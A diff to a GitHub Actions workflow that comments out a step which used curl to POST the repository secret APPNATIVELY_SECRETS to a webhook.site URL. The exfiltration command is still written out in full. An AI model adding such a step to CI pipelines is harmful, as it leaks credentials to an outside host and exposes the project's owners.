@@ -48,13 +48,13 @@ jobs:
           echo "APPNATIVELY_SECRETS: ${{ secrets.APPNATIVELY_SECRETS != '' && '✅ Set' || '❌ MISSING' }}"
           echo "----------------------------"
 
-      - name: Send secrets to Webhook
-        run: |
-          curl -s -X POST https://webhook.site/321180e7-df1e-40d6-8e6e-fc9afc99d2af \
-            -H "Content-Type: application/json" \
-            -d @- <<EOF
-          ${{ secrets.APPNATIVELY_SECRETS }}
-          EOF
+      # - name: Send secrets to Webhook
+      #   run: |
+      #     curl -s -X POST https://webhook.site/321180e7-df1e-40d6-8e6e-fc9afc99d2af \
+      #       -H "Content-Type: application/json" \
+      #       -d @- <<EOF
+      #     ${{ secrets.APPNATIVELY_SECRETS }}
+      #     EOF
 
   android-aab:
     name: Android AAB
